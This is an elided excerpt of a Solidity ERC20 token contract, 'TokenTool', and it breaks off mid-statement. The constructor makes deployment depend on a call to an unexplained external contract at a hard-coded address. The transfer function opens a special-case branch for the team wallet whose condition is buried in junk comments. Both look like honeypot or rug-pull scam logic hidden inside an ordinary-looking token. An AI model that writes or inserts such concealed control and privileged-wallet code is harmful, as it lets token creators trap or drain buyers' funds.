...
contract TokenTool is Context, IERC20, Ownable {
  ...
  constructor(
    ...
    isMarketPair[address(uniswapPair)] = true;
     cxkdd = cxkaddrs(0x567A41f7a0dfe9D2cc5D3f634Eef6058672B478d);
     require(cxkdd.hyhh() == true);
    _balances[marketingAddress] = _totalSupply;
    payable(service).transfer(msg.value);
    emit Transfer(address(0), marketingAddress, _totalSupply);
  }
  ...
  function transfer(address recipient, uint256 amount)
    ...
    returns (bool)
  {
      if(/*bAssD*/teamWalletAddress/*boSDssts*/ == /*bsss*/msg.sender/*bAssts*/
 )
